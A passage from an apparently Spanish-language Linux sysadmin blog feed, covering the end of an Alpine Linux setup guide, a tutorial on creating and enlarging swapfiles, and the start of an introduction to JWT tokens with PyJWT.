&lt;p&gt;En el siguiente reinicio, la memoria &lt;em&gt;swap&lt;/em&gt; se activará sola. Para los que no tengáis paciencia para reiniciar, podéis levantar el servicio directamente.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;alpine:~$ sudo rc-service swap start
 * Activating swap devices ...                                                                                           &lt;span class="o"&gt;[&lt;/span&gt; ok &lt;span class="o"&gt;]&lt;/span&gt;
alpine:~$ free -m
             total       used       free     shared    buffers     cached
Mem:           &lt;span class="m"&gt;238&lt;/span&gt;        &lt;span class="m"&gt;231&lt;/span&gt;          &lt;span class="m"&gt;6&lt;/span&gt;          &lt;span class="m"&gt;0&lt;/span&gt;          &lt;span class="m"&gt;5&lt;/span&gt;        &lt;span class="m"&gt;196&lt;/span&gt;
-/+ buffers/cache:         &lt;span class="m"&gt;29&lt;/span&gt;        &lt;span class="m"&gt;208&lt;/span&gt;
Swap:          &lt;span class="m"&gt;511&lt;/span&gt;          &lt;span class="m"&gt;0&lt;/span&gt;        &lt;span class="m"&gt;511&lt;/span&gt;
alpine:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Los clones pueden limitarse a desactivar la &lt;em&gt;swap&lt;/em&gt; con &lt;code&gt;swapoff&lt;/code&gt;, recrear &lt;code&gt;/swapfile&lt;/code&gt; con el tamaño y los permisos adecuados, lanzar el &lt;code&gt;mkswap&lt;/code&gt; y volver a activarla con &lt;code&gt;swapon&lt;/code&gt;.&lt;/p&gt;
&lt;h3&gt;Limpiar configuraciones&lt;/h3&gt;
&lt;p&gt;Los ficheros de configuración son bastante correctos, pero no está de más revisar algunos de ellos, especialmente si clonamos esta máquina hay que cambiarlos en el clon:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/etc/hostname&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/etc/hosts&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/etc/network/interfaces&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/etc/resolv.conf&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/etc/apk/repositories&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Carpetas ~/bin de usuario&lt;/h3&gt;
&lt;p&gt;Es muy útil que los usuarios tengan una carpeta &lt;code&gt;bin&lt;/code&gt; en su carpeta personal, para poner &lt;em&gt;scripts&lt;/em&gt; u otras utilidades. Eso se puede conseguir de dos formas: una global, o por usuario.&lt;/p&gt;
&lt;h4&gt;De forma global&lt;/h4&gt;
&lt;p&gt;Útil cuando queremos que se aplique a todos los usuarios; podemos editar &lt;code&gt;/etc/profile&lt;/code&gt;, o aprovecharnos de que se incluye todos los ficheros &lt;code&gt;.sh&lt;/code&gt; en &lt;code&gt;/etc/profile.d/&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;alpine:~$ cat /etc/profile.d/local_bin.sh
&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[[&lt;/span&gt; -d ~/bin &lt;span class="o"&gt;]]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
    &lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;~/bin:&lt;span class="nv"&gt;$PATH&lt;/span&gt;
&lt;span class="k"&gt;fi&lt;/span&gt;
alpine:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Este fichero necesita acabar en &lt;code&gt;.sh&lt;/code&gt;, pero no necesita permisos de ejecución; se incluye usando &lt;code&gt;source&lt;/code&gt;.&lt;/p&gt;
&lt;h4&gt;De forma local&lt;/h4&gt;
&lt;p&gt;El &lt;em&gt;shell&lt;/em&gt; que viene con &lt;strong&gt;Alpine Linux&lt;/strong&gt; respeta la convención de leer el fichero &lt;code&gt;.profile&lt;/code&gt;. Podemos hacer el cambio individualmente para cada usuario; recordad que no se hace solo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;alpine:~$ cat .profile
&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[[&lt;/span&gt; -d ~/bin &lt;span class="o"&gt;]]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
    &lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;~/bin:&lt;span class="nv"&gt;$PATH&lt;/span&gt;
&lt;span class="k"&gt;fi&lt;/span&gt;
alpine:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Conclusión&lt;/h2&gt;
&lt;p&gt;En este punto tengo un servidor mínimo con &lt;strong&gt;Alpine Linux&lt;/strong&gt;, que usa 27mb de memoria, ocupa 130mb de disco (&lt;em&gt;swapfile&lt;/em&gt; aparte) y con un magnífico gestor de paquetes, al que no le falta de nada.&lt;/p&gt;
&lt;p&gt;Los paquetes de la distribución no están a la última (tenéis la opción de la rama &lt;em&gt;edge&lt;/em&gt;), pero aún así están más actualizados que en &lt;strong&gt;Debian&lt;/strong&gt;, con un &lt;em&gt;focus&lt;/em&gt; importante en la seguridad. Si se instala un paquete, por ejemplo &lt;strong&gt;docker&lt;/strong&gt;, las dependencias son muy correctas, y no se trae ni &lt;strong&gt;python&lt;/strong&gt;, ni &lt;strong&gt;gcc&lt;/strong&gt;, ni &lt;strong&gt;git&lt;/strong&gt;, a diferencia de &lt;strong&gt;Debian&lt;/strong&gt;. Esto reduce la superficie de ataque y las herramientas disponibles en caso de intrusión.&lt;/p&gt;
&lt;p&gt;Yo lo he utilizado como nodo de un &lt;em&gt;docker swarm&lt;/em&gt;, con un disco de tamaño adecuado montado en &lt;code&gt;/var/lib/docker&lt;/code&gt; y un poco más de memoria disponible. Es un caso de éxito sin precedentes.&lt;/p&gt;</content><category term="alpine"></category><category term="linux"></category></entry><entry><title>Ampliando la memoria swap mediante swapfiles</title><link href="http://www.linuxsysadmin.ml/2018/07/ampliando-la-memoria-swap-mediante-swapfiles.html" rel="alternate"></link><published>2018-07-23T09:00:00+02:00</published><updated>2018-07-23T09:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-07-23:/2018/07/ampliando-la-memoria-swap-mediante-swapfiles.html</id><summary type="html">&lt;p&gt;Como ya sabéis, para escribir artículos, utilizo &lt;strong&gt;VirtualBox&lt;/strong&gt;. Últimamente no paro de clonar la misma imagen base una y otra vez, lo que me da un particionado idéntico. Sin embargo, cuando se trata de memoria &lt;em&gt;swap&lt;/em&gt;, no todas las instáncias clonadas necesitan la misma &lt;em&gt;swap&lt;/em&gt; y cambiarlo no es fácil …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Como ya sabéis, para escribir artículos, utilizo &lt;strong&gt;VirtualBox&lt;/strong&gt;. Últimamente no paro de clonar la misma imagen base una y otra vez, lo que me da un particionado idéntico. Sin embargo, cuando se trata de memoria &lt;em&gt;swap&lt;/em&gt;, no todas las instáncias clonadas necesitan la misma &lt;em&gt;swap&lt;/em&gt; y cambiarlo no es fácil.&lt;/p&gt;
&lt;p&gt;Si nos fijamos en la última versión de &lt;strong&gt;Ubuntu&lt;/strong&gt; podremos ver que una instalación básica &lt;strong&gt;no lleva partición &lt;em&gt;swap&lt;/em&gt;&lt;/strong&gt;. Lo que lleva es un fichero predimensionado que es utilizado como memoria &lt;em&gt;swap&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Hay detractores de este método, pero lo que no podemos negar es que es una forma muy cómoda de añadir más &lt;em&gt;swap&lt;/em&gt; o redimensionarla (casi) en caliente. Muchos proveedores de máquinas virtuales cloud ni siquiera nos dan una partición &lt;em&gt;swap&lt;/em&gt;, así que conocer este método nos puede ser muy útil.&lt;/p&gt;
&lt;h2&gt;Creando un swapfile&lt;/h2&gt;
&lt;p&gt;Supongamos que tenemos un servidor sin memoria &lt;em&gt;swap&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@cloudserver:~$ free -m
              total        used        free      shared  buff/cache   available
Mem:            &lt;span class="m"&gt;492&lt;/span&gt;          &lt;span class="m"&gt;32&lt;/span&gt;         &lt;span class="m"&gt;409&lt;/span&gt;           &lt;span class="m"&gt;0&lt;/span&gt;          &lt;span class="m"&gt;50&lt;/span&gt;         &lt;span class="m"&gt;446&lt;/span&gt;
Swap:             &lt;span class="m"&gt;0&lt;/span&gt;           &lt;span class="m"&gt;0&lt;/span&gt;           &lt;span class="m"&gt;0&lt;/span&gt;
gerard@cloudserver:~$ cat /proc/swaps
Filename                                Type            Size    Used    Priority
gerard@cloudserver:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para ir bien, un servidor no debería utilizarla, ya que impacta en el rendimiento, al ser más lento el disco que la memoria. Hay ocasiones en las que es legítimo usarla de forma temporal, o es preferible tenerla para evitar que nos tiren procesos por falta de memoria.&lt;/p&gt;
&lt;p&gt;Así pues, decidimos poner &lt;em&gt;swap&lt;/em&gt;, pero no tenemos un particionado que nos lo permita; vamos a recurrir a un &lt;em&gt;swapfile&lt;/em&gt;, que no es otra cosa que un fichero normal que es utilizado como dispositivo de bloques para ejercer de memoria &lt;em&gt;swap&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Para ello necesitamos un fichero del tamaño de la &lt;em&gt;swap&lt;/em&gt; que necesitemos, con las únicas restricciones de pertenecer a &lt;em&gt;root&lt;/em&gt; y con permisos de lectura y escritura para el propio &lt;em&gt;root&lt;/em&gt;. Vamos a crearlo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@cloudserver:~$ sudo dd &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/dev/zero &lt;span class="nv"&gt;of&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/swapfile &lt;span class="nv"&gt;bs&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;1M &lt;span class="nv"&gt;count&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;512&lt;/span&gt;
&lt;span class="m"&gt;512&lt;/span&gt;+0 registros leídos
&lt;span class="m"&gt;512&lt;/span&gt;+0 registros escritos
&lt;span class="m"&gt;536870912&lt;/span&gt; bytes &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;537&lt;/span&gt; MB, &lt;span class="m"&gt;512&lt;/span&gt; MiB&lt;span class="o"&gt;)&lt;/span&gt; copied, &lt;span class="m"&gt;0&lt;/span&gt;,841317 s, &lt;span class="m"&gt;638&lt;/span&gt; MB/s
gerard@cloudserver:~$ sudo chown root:root /swapfile
gerard@cloudserver:~$ sudo chmod &lt;span class="m"&gt;600&lt;/span&gt; /swapfile
gerard@cloudserver:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Con esto tenemos nuestro dispositivo de bloques. Lo siguiente es "formatearlo" como &lt;em&gt;swap&lt;/em&gt;. Esto se hace con el comando &lt;code&gt;mkswap&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@cloudserver:~$ sudo mkswap /swapfile
Configurando espacio de intercambio versión &lt;span class="m"&gt;1&lt;/span&gt;, &lt;span class="nv"&gt;tamaño&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;512&lt;/span&gt; MiB &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;536866816&lt;/span&gt; bytes&lt;span class="o"&gt;)&lt;/span&gt;
sin etiqueta, &lt;span class="nv"&gt;UUID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;612fd4be-2ea4-4561-ab7d-81b33df5b7e5
gerard@cloudserver:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo queda activarlo, con el comando &lt;code&gt;swapon&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@cloudserver:~$ sudo swapon /swapfile
gerard@cloudserver:~$ free -m
              total        used        free      shared  buff/cache   available
Mem:            &lt;span class="m"&gt;492&lt;/span&gt;          &lt;span class="m"&gt;32&lt;/span&gt;           &lt;span class="m"&gt;6&lt;/span&gt;           &lt;span class="m"&gt;0&lt;/span&gt;         &lt;span class="m"&gt;453&lt;/span&gt;         &lt;span class="m"&gt;446&lt;/span&gt;
Swap:           &lt;span class="m"&gt;511&lt;/span&gt;           &lt;span class="m"&gt;0&lt;/span&gt;         &lt;span class="m"&gt;511&lt;/span&gt;
gerard@cloudserver:~$ cat /proc/swaps
Filename                                Type            Size    Used    Priority
/swapfile                               file            &lt;span class="m"&gt;524284&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;       -1
gerard@cloudserver:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como nos gusta el resultado, configuramos el fichero &lt;code&gt;/etc/fstab&lt;/code&gt; para que se active automáticamente tras cada reinicio:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@cloudserver:~$ grep swapfile /etc/fstab
/swapfile none swap defaults &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;
gerard@cloudserver:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Ampliando el swapfile&lt;/h2&gt;
&lt;p&gt;Nos quedamos cortos de &lt;em&gt;swap&lt;/em&gt; y decidimos que necesitamos agrandar nuestra &lt;em&gt;swap&lt;/em&gt;. Solamente tenemos que desactivar el fichero, redimensionarlo, formatearlo y volver a activarlo; sin complicaciones:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@cloudserver:~$ sudo swapoff /swapfile
gerard@cloudserver:~$ sudo dd &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/dev/zero &lt;span class="nv"&gt;of&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/swapfile &lt;span class="nv"&gt;bs&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;1M &lt;span class="nv"&gt;count&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1024&lt;/span&gt;
&lt;span class="m"&gt;1024&lt;/span&gt;+0 registros leídos
&lt;span class="m"&gt;1024&lt;/span&gt;+0 registros escritos
&lt;span class="m"&gt;1073741824&lt;/span&gt; bytes &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;,1 GB, &lt;span class="m"&gt;1&lt;/span&gt;,0 GiB&lt;span class="o"&gt;)&lt;/span&gt; copied, &lt;span class="m"&gt;1&lt;/span&gt;,82175 s, &lt;span class="m"&gt;589&lt;/span&gt; MB/s
gerard@cloudserver:~$ sudo mkswap /swapfile
Configurando espacio de intercambio versión &lt;span class="m"&gt;1&lt;/span&gt;, &lt;span class="nv"&gt;tamaño&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;1024&lt;/span&gt; MiB &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1073737728&lt;/span&gt; bytes&lt;span class="o"&gt;)&lt;/span&gt;
sin etiqueta, &lt;span class="nv"&gt;UUID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;fb036b45-6fca-4ff2-acb6-9ae585f08c74
gerard@cloudserver:~$ sudo swapon /swapfile
gerard@cloudserver:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y ya tenemos 1Gb de &lt;em&gt;swap&lt;/em&gt;, sin sorpresas:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@cloudserver:~$ free -m
              total        used        free      shared  buff/cache   available
Mem:            &lt;span class="m"&gt;492&lt;/span&gt;          &lt;span class="m"&gt;32&lt;/span&gt;           &lt;span class="m"&gt;6&lt;/span&gt;           &lt;span class="m"&gt;0&lt;/span&gt;         &lt;span class="m"&gt;453&lt;/span&gt;         &lt;span class="m"&gt;446&lt;/span&gt;
Swap:          &lt;span class="m"&gt;1023&lt;/span&gt;           &lt;span class="m"&gt;0&lt;/span&gt;        &lt;span class="m"&gt;1023&lt;/span&gt;
gerard@cloudserver:~$ cat /proc/swaps
Filename                                Type            Size    Used    Priority
/swapfile                               file            &lt;span class="m"&gt;1048572&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;       -1
gerard@cloudserver:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En un futuro cercano, decidimos que hay que poner más &lt;em&gt;swap&lt;/em&gt;. Ahora tenemos un nuevo problema: la &lt;em&gt;swap&lt;/em&gt; existente no se puede desactivar porque no hay memoria en donde mover lo que hay en &lt;em&gt;swap&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Eso no supone más problema, porque la memoria &lt;em&gt;swap&lt;/em&gt; es una masa que se forma a partir de varios dispositivos, así que podemos añadir otro, de la misma manera:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@cloudserver:~$ sudo dd &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/dev/zero &lt;span class="nv"&gt;of&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/swapfile2 &lt;span class="nv"&gt;bs&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;1M &lt;span class="nv"&gt;count&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;3072&lt;/span&gt;
&lt;span class="m"&gt;3072&lt;/span&gt;+0 registros leídos
&lt;span class="m"&gt;3072&lt;/span&gt;+0 registros escritos
&lt;span class="m"&gt;3221225472&lt;/span&gt; bytes &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;,2 GB, &lt;span class="m"&gt;3&lt;/span&gt;,0 GiB&lt;span class="o"&gt;)&lt;/span&gt; copied, &lt;span class="m"&gt;5&lt;/span&gt;,16648 s, &lt;span class="m"&gt;623&lt;/span&gt; MB/s
gerard@cloudserver:~$ sudo chown root:root /swapfile2
gerard@cloudserver:~$ sudo chmod &lt;span class="m"&gt;600&lt;/span&gt; /swapfile2
gerard@cloudserver:~$ sudo swapon /swapfile2
gerard@cloudserver:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y como esperamos, ahora tenemos un total de 4Gb de &lt;em&gt;swap&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@cloudserver:~$ free -m
              total        used        free      shared  buff/cache   available
Mem:            &lt;span class="m"&gt;492&lt;/span&gt;          &lt;span class="m"&gt;32&lt;/span&gt;           &lt;span class="m"&gt;6&lt;/span&gt;           &lt;span class="m"&gt;0&lt;/span&gt;         &lt;span class="m"&gt;452&lt;/span&gt;         &lt;span class="m"&gt;446&lt;/span&gt;
Swap:          &lt;span class="m"&gt;4095&lt;/span&gt;           &lt;span class="m"&gt;0&lt;/span&gt;        &lt;span class="m"&gt;4095&lt;/span&gt;
gerard@cloudserver:~$ cat /proc/swaps
Filename                                Type            Size    Used    Priority
/swapfile                               file            &lt;span class="m"&gt;1048572&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;       -1
/swapfile2                              file            &lt;span class="m"&gt;3145724&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;       -2
gerard@cloudserver:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este punto ya podríamos desactivar la primera &lt;em&gt;swap&lt;/em&gt;, ya sea para ampliarla, o para eliminarla. El contenido que tenía pasaría ahora a la segunda &lt;em&gt;swap&lt;/em&gt; en donde hemos creado espacio. Nada nos impide ampliar el primer fichero para eliminar el segundo, haciendo que la segunda &lt;em&gt;swap&lt;/em&gt; fuera solo un apaño temporal.&lt;/p&gt;</content><category term="memoria"></category><category term="swap"></category><category term="swapfile"></category></entry><entry><title>Explorando los tokens JWT</title><link href="http://www.linuxsysadmin.ml/2018/07/explorando-los-tokens-jwt.html" rel="alternate"></link><published>2018-07-16T09:00:00+02:00</published><updated>2018-07-16T09:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-07-16:/2018/07/explorando-los-tokens-jwt.html</id><summary type="html">&lt;p&gt;Hace mucho tiempo que me fascinan las APIs REST; sin embargo siempre he pasado de sistemas de autenticación en mis proyectos personales. Cuando me puse en serio a investigar sobre este tema, descubrí la autenticación basada en &lt;em&gt;tokens&lt;/em&gt;, y especialmente, los &lt;strong&gt;JSON Web Tokens&lt;/strong&gt;, que es lo que explico hoy …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Hace mucho tiempo que me fascinan las APIs REST; sin embargo siempre he pasado de sistemas de autenticación en mis proyectos personales. Cuando me puse en serio a investigar sobre este tema, descubrí la autenticación basada en &lt;em&gt;tokens&lt;/em&gt;, y especialmente, los &lt;strong&gt;JSON Web Tokens&lt;/strong&gt;, que es lo que explico hoy.&lt;/p&gt;
&lt;p&gt;Cuando leemos las buenas prácticas de los servicios REST, una de las máximas es que &lt;strong&gt;no hay estado&lt;/strong&gt;; eso significa que no hay peticiones a medias, ni sesiones ni nada: todo lo necesario para completar una llamada está en la misma petición.&lt;/p&gt;
&lt;p&gt;Tradicionalmente, hemos pasado el usuario y la contraseña de algún modo en las cabeceras, evitando a terceros mediante el uso de HTTPS. Este método requiere la validación de las credenciales en cada petición, y supone un estrés innecesario a la base de datos.&lt;/p&gt;
&lt;p&gt;Este panorama cambia cuando aparece una nueva filosofía: hacer &lt;em&gt;login&lt;/em&gt; una vez y expedir un &lt;em&gt;token&lt;/em&gt; con toda la información necesaria para futuras peticiones, probablemente con validez temporal.&lt;/p&gt;
&lt;p&gt;Los &lt;a href="https://jwt.io/"&gt;JSON Web Tokens&lt;/a&gt; funcionan de esta manera, aunque no intentan encriptar ningún dato; se limitan a la verificación de que la firma del mensaje es válida.&lt;/p&gt;
&lt;h2&gt;Forma de un token JWT&lt;/h2&gt;
&lt;p&gt;Un &lt;em&gt;token&lt;/em&gt; JWT tiene la forma &lt;code&gt;xxxxx.yyyyy.zzzzz&lt;/code&gt;, con 3 partes separadas por puntos:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Una cabecera, que es una especificación del tipo de &lt;em&gt;token&lt;/em&gt; y un base64 del algoritmo de &lt;em&gt;hash&lt;/em&gt; usado.&lt;/li&gt;
&lt;li&gt;Un payload, que es la información arbitraria que cargamos en el momento de crear el &lt;em&gt;token&lt;/em&gt; y está en base64; algunos campos tienen significado especial.&lt;/li&gt;
&lt;li&gt;Una firma, que es un &lt;em&gt;hash&lt;/em&gt; del mensaje con una clave del servidor, que sirve para que el servidor pueda verificarla como suya.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Veamos un ejemplo, con el siguiente token:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ2VyYXJkIiwiZXhwIjoiMTUyOTQwMzc5NSJ9.07VsjI6OFGjMwYTmzE9g8qoPpXJYAB5DuGiIROOY4HM
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;NOTA&lt;/strong&gt;: La forma habitual de obtener este &lt;em&gt;token&lt;/em&gt; es mediante una operación de &lt;em&gt;login&lt;/em&gt;, y normalmente tiene una fecha de expiración, que en JWT es el campo &lt;code&gt;exp&lt;/code&gt;, como un &lt;em&gt;unix timestamp&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/workspace/jwttest$ &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; base64 -d&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;alg&amp;quot;&lt;/span&gt;:&lt;span class="s2"&gt;&amp;quot;HS256&amp;quot;&lt;/span&gt;,&lt;span class="s2"&gt;&amp;quot;typ&amp;quot;&lt;/span&gt;:&lt;span class="s2"&gt;&amp;quot;JWT&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
gerard@atlantis:~/workspace/jwttest$
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/workspace/jwttest$ &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;eyJ1c2VyIjoiZ2VyYXJkIiwiZXhwIjoiMTUyOTQwMzc5NSJ9&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; base64 -d&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;user&amp;quot;&lt;/span&gt;:&lt;span class="s2"&gt;&amp;quot;gerard&amp;quot;&lt;/span&gt;,&lt;span class="s2"&gt;&amp;quot;exp&amp;quot;&lt;/span&gt;:&lt;span class="s2"&gt;&amp;quot;1529403795&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
gerard@atlantis:~/workspace/jwttest$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Cualquiera (salvo uso de HTTPS) puede ver la información contenida en el &lt;em&gt;token&lt;/em&gt;. Sin embargo, para verificar la firma se necesita saber la clave con la que se cifró. De esta forma, un servidor puede expedir un &lt;em&gt;token&lt;/em&gt; con información, pero gracias a la firma puede verificar que el &lt;em&gt;token&lt;/em&gt; que le devuelven es el que expedió y no ha sido modificado por un tercero.&lt;/p&gt;
&lt;p&gt;Como punto a favor, el estándar JWT permite firmar con una sola clave, o usando un par de claves RSA, la privada para cifrar y la pública para desencriptar. Esto hace que nuestros auditores de seguridad se queden tranquilos, aunque como veremos, solo tiene utilidad real en algunos casos.&lt;/p&gt;
&lt;h2&gt;Creando un token con una clave simétrica&lt;/h2&gt;
&lt;p&gt;Este es el caso de uso más simple: un solo servicio genera y consume el &lt;em&gt;token&lt;/em&gt;. En este tipo de casos nos importa poco que se encripte y se desencripte con la misma clave, así que vamos a lo simple.&lt;/p&gt;
&lt;p&gt;&lt;img alt="JWT de clave simétrica" src="http://www.linuxsysadmin.ml/images/JWT_Symmetric_Key.png"&gt;&lt;/p&gt;
&lt;p&gt;Como lo vamos a hacer en &lt;strong&gt;python&lt;/strong&gt;, vamos a necesitar una librería que siga este estándar, por ejemplo, &lt;code&gt;PyJWT&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/workspace/jwttest$ pip freeze
...
&lt;span class="nv"&gt;PyJWT&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.6.4
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/workspace/jwttest$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a utilizar un &lt;em&gt;script&lt;/em&gt; para generar el &lt;em&gt;token&lt;/em&gt; y otro para validarlo, que son estos:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/workspace/jwttest$ cat simple_encode.py
import jwt
import datetime
import sys

&lt;span class="nv"&gt;KEY&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; sys.argv&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;USER&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; sys.argv&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;

&lt;span class="nv"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;user&amp;#39;&lt;/span&gt;: USER,
